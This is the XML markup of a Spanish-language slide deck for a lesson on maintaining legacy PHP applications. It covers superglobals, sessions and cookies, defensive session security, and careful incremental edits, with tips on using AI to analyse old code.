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svg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-70-4.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-70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301-taller-de-aplicaciones-para-internet\.agent\skills\slides-aiep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"/>
            <a:ext cx="1097280" cy="3840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4672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11910" y="1682496"/>
            <a:ext cx="307238" cy="81930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470355" y="1912925"/>
            <a:ext cx="256032" cy="58887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2578608"/>
            <a:ext cx="93817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e Integración con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" y="4041648"/>
            <a:ext cx="93817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06 · Clase 01: El valor del mantenimiento y la arqueología técnica.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796528" y="5321808"/>
            <a:ext cx="749808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9" name="Image 1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Contexto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¿PHP está muerto?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meme vs. la Realidad Laboral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714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77% de la Web todavía corre sobre PHP. Los sistemas que hoy facturan millones suelen ser 'Legacy'.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04672" y="3493008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6210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6941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de la Oportunidad Laboral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VIVO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4133088"/>
            <a:ext cx="73152" cy="15361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Sistemas Vivos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Apps que sostienen la operación diaria de empresas reales.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4041648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51376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51376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663440" y="4133088"/>
            <a:ext cx="73152" cy="15361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64608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Misión Crítica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4864608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Reglas de negocio que solo existen en ese código antiguo.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7132320" y="4005072"/>
            <a:ext cx="2907792" cy="1792224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42048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42048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OPOR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754112" y="4133088"/>
            <a:ext cx="73152" cy="15361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0" y="415137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Oportunidad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7955280" y="4443984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Saber mantener es más valioso que solo saber crear.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Mentalidad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Perfil del Ingeniero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somos solo 'creadores de apps'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Médicos de Sistemas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Amateur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Destructivo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Dice: 'esto es basura'.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Quiere borrar y reescribir.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los riesgos del negocio.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Profesional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Quirúrgico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Dice: '¿cómo funciona?'.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Hace cambios incrementales.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 el Axioma de Integridad.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técnico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Objetivos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Objetivos de la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misión para hoy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lograremos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Identificar Estructuras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Diferenciar Arquitectura de Archivos vs Recursos.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Técnica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PHP legacy sin entrar en pánico.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Gestionar Estado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Dominar sesiones y cookies nativas de servidor.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Aplicar el Axioma de Integridad en un CRUD real.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Mapa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Ruta de Aprendizaje: Hoy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Bloques de Arqueología Técnica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01568"/>
            <a:ext cx="100584" cy="23408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070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Psicología y Valor del Legado.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18211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5526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3814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3814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Esencial y Superglobales.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55955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3270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1558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81558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Sesiones y Estado del Usuario.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936992" y="3291840"/>
            <a:ext cx="2194560" cy="25603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10144" y="3401568"/>
            <a:ext cx="100584" cy="23408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93024" y="341985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93024" y="3694176"/>
            <a:ext cx="186537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Quirúrgico CRUD.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Ingeniería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Principio de Integridad Técnica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Estabilidad vs. Impulso de Reescritura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2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 32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sistemas de misión crítica, la estabilidad es el activo más valioso. Un ingeniero profesional no borra: comprende, protege e interviene con precisión.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Psicología y Valor del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Código Legado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por qué lo 'viejo' sostiene el presente.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¿Qué es realmente el Código Legado?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1.1 El valor del negocio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Cambiando la perspectiva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'Es código basura escrito por alguien que no sabía'.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código que ha sobrevivido al tiempo y ataques reales.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'Es aburrido y no tiene valor tecnológico'.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el sistema que paga los sueldos y sostiene el negocio.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código legacy es un activo.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décadas de reglas de negocio que nadie documentó.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Mantenimiento = Ingeniería.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requiere más nivel para reparar que para crear de cero.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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 vs. Recursos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Diferencia Estructural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llegamos al dato?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FastAPI (Moderno)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Lógicos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abstraída (/users/5).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framework rutea.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Independiente del disco.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 Legacy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 Físicos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URL directa (detalle.php).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carpeta es la API.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archivo no está, la ruta cae.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Carpeta es la API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1.2 Organización física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el legado, si mueves o renombras un archivo físico, destruyes el punto de acceso.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9381744" cy="29260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25526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32841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Mapeo Físico vs. Lógico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767328"/>
            <a:ext cx="73152" cy="19019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/index.php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Punto de entrada principal. Suele contener el dashboard o la lista principal.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4041648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51376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51376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663440" y="3767328"/>
            <a:ext cx="73152" cy="19019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64608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/login.php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4864608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Procesador de credenciales. Recibe el POST y crea la sesión.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7132320" y="3639312"/>
            <a:ext cx="2907792" cy="2157984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242048" y="37673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42048" y="38130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7754112" y="3767328"/>
            <a:ext cx="73152" cy="19019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0" y="37856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/admin/edit.php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7955280" y="4078224"/>
            <a:ext cx="195681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protegida. El anidamiento de carpetas define la jerarquía.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Patrón 'Espagueti'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1.3 Mezcla de responsabilidades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2070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¿Por qué todo está mezclado?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PHP legacy, es normal encontrar SQL, lógica de negocio y HTML en el mismo archivo. Era el estándar de inmediatez antes de los frameworks.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675888"/>
            <a:ext cx="9381744" cy="2505456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 146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78561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85876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Anatomía de un archivo mezclado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242816"/>
            <a:ext cx="8961120" cy="17556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Arqueóloga de Software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Estrategia de Exploración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Cambiando el objetivo del Prompt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Reescritura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Intento de modernización ciega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'Este código es viejo, reescríbelo en FastAPI para que sea moderno'.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dependencias ocultas.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Rompe la base de datos actual.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sistema incompatible.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de Arqueología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Exploración y Diagnóstico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este PHP: lista qué variables recibe, qué tablas consulta y qué validaciones hace'.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Extrae reglas de negocio reales.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puntos de falla.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el sistema estable.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no es tu reemplazo, es tu microscopio para entender sistemas complejos.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Estrategia de Exploración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1.4 ¿Qué leer primero?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Reconocimiento del Sistema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 de Conexión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archivos como 'config.php' o 'db.php'. Identifica el servidor, usuario y base de datos.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Captura de Entradas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 todas las variables $_POST. Ellas definen qué datos está esperando el script.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Lógica de Persistencia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 los comandos INSERT, UPDATE o DELETE. Es el corazón de la operación.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 de Datos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dónde se imprimen variables en el HTML. Define qué verá el usuario final.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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proponer una 'reescritura total' es un riesgo financiero?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significa que la estructura de carpetas sea la API en PHP legacy?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puede un agente de IA ayudar a entender un archivo de 500 líneas?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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Dignificando el Legado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legado no es un estorbo, es un activo funcional que requiere respeto y maestría técnica.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PHP Esencial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 Esencial y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Superglobales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Aprendiendo a leer el idioma que sostiene la web.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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de Supervivencia I: Variables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Declaración y Tipado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y Tipado Dinámico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II: Strings y Concatenación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El punto en lugar del más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Operaciones con Texto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Concatenación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el punto (.) para unir textos. Ejemplo: 'Hola ' . $user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Comillas Simples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literal. No procesa variables internas.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DBL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Comillas Dobles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Interpolación: "Hola $nombre" funciona directamente.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Confusión Común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uses + para concatenar; PHP intentará sumar matemáticamente.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Arreglos Asociativos (El Corazón)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Los 'Diccionarios' de PHP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Son la estructura fundamental para transportar datos desde la DB y los formularios.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2926080"/>
            <a:ext cx="4572000" cy="3255264"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 112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035808"/>
            <a:ext cx="431596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108960"/>
            <a:ext cx="4096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Sintaxis de Arreglo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3493008"/>
            <a:ext cx="4151376" cy="2505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4416" y="2926080"/>
            <a:ext cx="4572000" cy="1408176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614416" y="2926080"/>
            <a:ext cx="4572000" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="102A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Estructura en Memoria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934456" y="3319272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(Índice)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860536" y="3319272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(Valor)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705856" y="3529584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934456" y="3557016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860536" y="3557016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705856" y="3767328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34456" y="3794760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860536" y="3794760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'TECH-01'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705856" y="4005072"/>
            <a:ext cx="4389120" cy="9144"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="F8F3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934456" y="4032504"/>
            <a:ext cx="2880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precio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860536" y="4032504"/>
            <a:ext cx="1234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25000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Bucles de Lectura: foreach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2.1 Procesando colecciones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Recorriendo resultados de base de datos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Sándwich PHP/HTML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Renderizado en Servidor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ve cada uno?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Servidor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Lee el archivo .php.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etiquetas &lt;?php ?&gt;.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 la lógica.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Recibe solo HTML puro.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sabe que existió PHP.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Renderiza el texto.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envía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Etiquetas de Salida e Inyección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2.2 Escribiendo en el HTML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Formas de mostrar datos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Superglobales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El origen de la verdad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24128"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 357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Son arreglos asociativos creados por el servidor que contienen datos de la petición HTTP.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04672" y="3291840"/>
            <a:ext cx="9381744" cy="2889504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4198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4930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más importantes hoy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931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$_GET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visibles en la URL (Query Params).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931920"/>
            <a:ext cx="73152" cy="7223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$_POST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ocultos en el cuerpo (Formularios).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572768" y="5074920"/>
            <a:ext cx="73152" cy="7223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773936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$_SESSION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773936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 persistentes del usuario en el servidor.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208776" y="5074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9944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$_SERVER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409944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Información técnica (IP, Browser, Ruta).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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$_GET: La Verdad en la URL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Parámetros de consulta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GET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utiliza para 'pedir' o 'filtrar' información. Todo lo que esté después del signo '?' en la URL llega a este arreglo.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Ejemplo: perfil.php?id=42&amp;tema=oscuro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$_POST: La Verdad en el Body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Procesando formularios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POST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utiliza para 'enviar' o 'crear' información sensible. Los datos no son visibles en la URL y no tienen límite de tamaño estricto.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Ejemplo: Registro de usuario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Mapeo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Diagrama de Mapeo de Formulario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De HTML a PHP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560320"/>
            <a:ext cx="411480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688336"/>
            <a:ext cx="109728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67004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Lado del Cliente (HTML)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017520"/>
            <a:ext cx="376732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&lt;input name="user_id" value="5"&gt;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19472" y="3291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62027"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5833872" y="2560320"/>
            <a:ext cx="43525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25312" y="2688336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89904" y="2670048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Lado del Servidor (PHP)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089904" y="3017520"/>
            <a:ext cx="40050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$_POST['user_id'] // Vale 5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04672" y="5120640"/>
            <a:ext cx="9381744" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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5285232"/>
            <a:ext cx="8979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atributo 'name' en HTML es la llave del arreglo en PHP.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de Existencia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2.3 Evitando el error 500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saber si el dato llegó?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ISSET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isset()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Devuelve true si la variable existe y no es nula. Evita el 'Undefined index'.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COAL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Operador ??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Asigna un valor por defecto si no existe. $id = $_GET['id'] ?? 0;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EMPTY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empty()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 si el valor es 'falsy' (cero, string vacío, false).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Amnesia de Índices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Intentar leer $_POST['x'] si no se envió causa un error fatal.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Traductora de Sintaxis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Entendiendo el Contrato de Datos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Novato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reescritura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'Limpia este código PHP y hazlo más corto'.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validaciones necesarias.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 nombres de variables.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Pierde la conexión original.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de Traducción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Mapeo a Pseudocódigo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'Explica qué campos espera este script en $_POST y genera una clase Pydantic equivalente para entenderlo'.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Mapea el contrato real.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Documenta el sistema.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 la futura integración.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la IA para leer lo que no entiendes, no para ignorar el código legacy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8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Práctica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Actividad Relámpago: Detecta los Inputs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Desafío de lectura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3657600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1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datos necesita este script?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290779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4672" y="5797296"/>
            <a:ext cx="9381744" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667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5961888"/>
            <a:ext cx="8979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Identifica: 1. Un dato de URL | 2. Un dato de Formulario | 3. Un dato de Memoria.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Arquitectura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Evolución del Tipado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 · De lo Dinámico a lo Estricto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6217920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596188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5742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8.0+: Tipado Fuerte Nativo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5797296" cy="34015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260336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33488" y="2139696"/>
            <a:ext cx="100584" cy="39319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16368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Fin del Caos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16368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El tipado dinámico del legado causaba errores silenciosos.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PHP moderno permite definir contratos claros (como FastAPI).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Usamos IA para 'tipear' el código antiguo durante el mantenimiento.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símbolo distingue a las variables en PHP sin importar su tipo?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se diferencia el uso de $_GET frente al de $_POST en un CRUD?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atributo 'name' de HTML es vital para el servidor PHP?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="156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2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Mapa del Idioma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Entender PHP legacy no es aprender un lenguaje nuevo, es aprender a leer cómo fluye HTTP.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 $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Variables sin tipo obligatorio y arreglos asociativos.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vive dentro del HTML inyectando datos con echo.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Superglobales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verdad llega vía $_GET y $_POST.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Sesiones y Cookies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Sesiones, Cookies y el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del Usuario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el servidor construye una memoria persistente en un mundo sin estado.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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Problema: HTTP Stateless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La amnesia del servidor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defecto, HTTP no tiene memoria. Cada petición es un 'extraño' para el servidor.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127248"/>
            <a:ext cx="4590288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236976"/>
            <a:ext cx="100584" cy="20665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25526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1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60704" y="3529584"/>
            <a:ext cx="4261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User: 'Hola, soy Diego'.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Server: 'Ok, toma tu perfil'.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96128" y="3127248"/>
            <a:ext cx="4590288" cy="2286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0" y="3236976"/>
            <a:ext cx="100584" cy="20665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52160" y="3255264"/>
            <a:ext cx="4261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2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852160" y="3529584"/>
            <a:ext cx="4261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User: 'Dime mi saldo'.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Server: '¿Quién eres tú?'.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Solución: El Casillero del Servidor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3.1 session_start()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Mecánica de session_start()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Iniciación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archivo físico en el servidor (usualmente en /tmp) para este usuario.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Identificador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 un ID único y aleatorio de 32 caracteres (PHPSESSID).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COOKIE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09344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10512" y="446227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Envío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10512" y="4754880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inyecta automáticamente el ID en los headers de respuesta HTTP.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 de Oro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ejecutarse antes de enviar CUALQUIER texto al navegador.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Puente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Simbiosis: Sesión ↔ Cookie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El ticket de entrada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560320"/>
            <a:ext cx="411480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688336"/>
            <a:ext cx="109728" cy="20299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670048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Servidor (Sesión)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3017520"/>
            <a:ext cx="376732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los datos reales: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nombre: 'Diego'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rol: 'admin'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id: 102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919472" y="3291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62027"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔗 PHPSESSID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833872" y="2560320"/>
            <a:ext cx="4352544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25312" y="2688336"/>
            <a:ext cx="109728" cy="20299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89904" y="2670048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 (Cookie)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089904" y="3017520"/>
            <a:ext cx="400507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Contiene solo el ID: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Value: 'abc123xyz...'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Domain: 'mi-app.com'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04672" y="5120640"/>
            <a:ext cx="9381744" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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05840" y="5285232"/>
            <a:ext cx="8979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Cookie es el ticket; la Sesión es el casillero que abre ese ticket.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Anatomía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 una Cookie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El Protocolo Crudo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993392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03120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176272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Header HTTP: Set-Cookie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60320"/>
            <a:ext cx="8961120" cy="53035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4672" y="3493008"/>
            <a:ext cx="9381744" cy="256032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32688" y="36210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42416" y="36941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Desglose Técnico de Atributos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950976" y="4005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60704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1060704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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1572768" y="4133088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773936" y="4151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Name/Value</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936" y="4443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par clave-valor que identifica la sesión (PHPSESSID).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="4005072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696712" y="413308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96712" y="417880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780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4133088"/>
            <a:ext cx="73152" cy="5577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09944" y="415137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Expires</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6409944" y="4443984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Fecha exacta en que el navegador borrará la cookie automáticamente.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="4983480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1060704" y="5111496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060704" y="5157216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780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1572768" y="5111496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1773936" y="5129784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HttpOnly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936" y="542239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de Oro: impide que JavaScript lea la cookie, mitigando ataques XSS.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="4983480"/>
            <a:ext cx="4453128" cy="813816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696712" y="5111496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696712" y="5157216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780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="5111496"/>
            <a:ext cx="73152" cy="5577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9944" y="5129784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Secure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6409944" y="5422392"/>
            <a:ext cx="3502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Obliga a que la cookie solo viaje si la conexión es HTTPS (cifrada).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Sintaxis: Gestionando el Estado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El arreglo $_SESSION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y Escritura de Sesión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Puente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 Autenticación (Login)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El ciclo completo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la petición a la persistencia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REQ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POST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usuario envía user/pass desde un formulario HTML.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VAL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consulta la DB y confirma que el usuario es real.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WRIT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6420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65376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Escritura en Sesión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65376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es válido, guardamos sus datos en el arreglo $_SESSION.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7548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REDI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30021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01384" y="4462272"/>
            <a:ext cx="3410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Redirección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501384" y="4754880"/>
            <a:ext cx="34107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Enviamos al usuario al dashboard usando header('Location: ...').</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Protección de Rutas (Middleware Legacy)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Control de Acceso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importancia de la validación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legado, no hay sistema de roles automático. Debemos preguntar manualmente en cada página si el usuario tiene permiso.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auth_check.php (Fragmento)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Protocolo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ID de Sesión en Acción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3.2 Viaje en los Headers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 vía Headers HTTP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609344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10512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Respuesta (Login)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810512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envía el Header 'Set-Cookie: PHPSESSID=abc123...'.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Almacenamiento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guarda el ID en su jarra de cookies local asociada al dominio.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09344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10512" y="446227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Petición (Perfil)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10512" y="4754880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cada nuevo clic, el navegador incluye el Header 'Cookie: PHPSESSID=abc123...'.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45352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46520" y="446227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Reconocimiento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46520" y="4754880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lee el ID, busca el archivo en /tmp y rellena el arreglo $_SESSION.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Seguridad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I: Secuestro de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Session Hijacking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proteger la Cookie?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usuario no puede ver su PHPSESSID.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Está visible en el inspector (Application -&gt; Cookies).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MITO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ID es imposible de adivinar.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robar vía XSS si no usas HttpOnly.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Robo de identidad técnica.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un atacante tiene tu PHPSESSID, es el dueño de tu sesión.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HTTPS.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Cifra el viaje del ID para que no sea capturado en la red.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="104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II: Regeneración de ID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session_regenerate_id()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38988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Cambiando la llave al entrar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práctica de ingeniería vital es cambiar el ID de sesión apenas el usuario se loguea. Esto invalida cualquier ID que un atacante haya intentado pre-establecer.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840480"/>
            <a:ext cx="9381744" cy="2340864"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 156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95020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02336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Implementación Segura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407408"/>
            <a:ext cx="89611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Destrucción del Estado (Logout)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3.3 Quemando el casillero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Limpieza Total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UNSET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unset($_SESSION['x'])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una sola llave. El usuario sigue logueado pero sin ese dato.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$_SESSION = []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Limpia todas las variables pero mantiene el archivo de sesión.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BURN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session_destroy()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Elimina el archivo físico del servidor. El usuario es olvidado.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EXPI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Expiración por inactividad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servidor borra sesiones viejas automáticamente tras X minutos.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Auditora de Sesiones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Auditoría de Seguridad en Legado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Creación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foco en seguridad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'Crea un script de login en PHP con sesiones'.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session_start básico.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regenera IDs.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Olvida validaciones de HttpOnly.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Auditoría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 Crítico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este script de login legacy: identifica vulnerabilidades en el manejo de PHPSESSID y sugiere parches quirúrgicos'.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Detecta riesgos de Hijacking.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 mejoras de integridad.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la arquitectura original.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agente es tu consultor de seguridad, no solo un generador de código.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="84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pasaría si ejecutamos código HTML antes del comando session_start()?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ID de sesión viaja en una Cookie y no en la URL por seguridad?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 es la diferencia técnica entre usar unset() y session_destroy()?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="156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 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Memoria del Backend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sesiones son el pegamento técnico que convierte páginas aisladas en una Aplicación Web real.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session_start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Apertura del casillero privado en el servidor.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PHPSESSID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ticket físico que el navegador presenta en cada clic.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Integridad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obligación de destruir y regenerar IDs por seguridad.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" y="5413248"/>
            <a:ext cx="9381744" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 483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77824" y="5522976"/>
            <a:ext cx="100584" cy="3474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5541264"/>
            <a:ext cx="9052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Bloque → Mantenimiento Quirúrgico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621792"/>
            <a:ext cx="120700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6583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1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3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Arte del Mantenimiento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Quirúrgico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04672" y="3310128"/>
            <a:ext cx="7498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Aplicando el Axioma de Integridad en escenarios reales de producción.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="152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Anatomía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Anatomía del 'Todo-en-Uno'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 Descomposición del archivo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 típica de un archivo legacy (editar_user.php)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L1-15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Cabecera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session_start() y Conexión a Base de Datos (mysqli).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L16-45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45352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46520" y="268833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Lógica POST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46520" y="2980944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if($_POST) -&gt; Captura datos y ejecuta el UPDATE SQL.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L46-55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609344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810512" y="446227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810512" y="4754880"/>
            <a:ext cx="34655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inicial para cargar los datos actuales en el form.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L56+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Vista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Mezcla de HTML con PHP para mostrar los valores (echo).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Axioma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Estabilidad &gt; Elegancia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4.2 La prioridad del Ingeniero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no reescribir?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Riesgo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Reescritura Total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Introduce bugs en lógica vieja.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Incompatible con el resto del sitio.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Cuesta tiempo que el cliente no paga.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Valor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Cirugía Quirúrgica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sistema sigue operando.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preciso y testeable.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la coherencia del autor.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Axioma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destruir</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="72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Misión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Escenario de Mantenimiento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Caso de Uso Real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5727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Requerimiento del Cliente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aplicación de gestión de empleados tiene 8 años. El cliente necesita agregar el campo 'Teléfono de Emergencia' al formulario de edición de perfil hoy mismo. No hay presupuesto ni tiempo para migrar a FastAPI.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4041648"/>
            <a:ext cx="9381744" cy="2139696"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 17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416966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24281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de Operación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50976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572768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773936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Mapear</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936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Localizar variables.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4041648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51376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51376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4663440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64608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Inyectar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4864608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y HTML nuevo.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7132320" y="4553712"/>
            <a:ext cx="2907792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242048" y="468172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242048" y="472744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7754112" y="4681728"/>
            <a:ext cx="7315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0" y="4700016"/>
            <a:ext cx="1956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Validar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7955280" y="499262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Smoke test.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Cirugía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Fase 1: Mapeo de la Entrada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Capturando el nuevo dato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Localización del bloque $_POST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Cirugía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Fase 2: Mapeo de la Persistencia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Inyectando en el SQL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Modificación de la Query UPDATE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Cirugía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Fase 3: Mapeo de la Vista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Inyectando en el HTML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Formulario HTML Mezclado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Arqueología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Arqueología: El Archivo Monstruo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Mapeo de Grandes Volúmenes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desafío de las 1000+ líneas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producción, no operamos archivos de 20 líneas. Encontraremos scripts gigantes con lógica de hace 10 años. No podemos leerlo todo; debemos mapear.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2102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9417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Táctica de Mapeo con IA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950976" y="4005072"/>
            <a:ext cx="4453128" cy="877824"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4167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" y="413308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17880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609344" y="4133088"/>
            <a:ext cx="73152" cy="6217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810512" y="415137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 de Contexto</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1810512" y="4443984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Entregar el archivo completo al agente para análisis de flujo.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="4005072"/>
            <a:ext cx="4453128" cy="877824"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4167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96712" y="4133088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96712" y="4178808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780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="4133088"/>
            <a:ext cx="73152" cy="6217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151376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Extracción de Nombres</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="4443984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Listar variables de sesión y POST que el archivo utiliza.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="5047488"/>
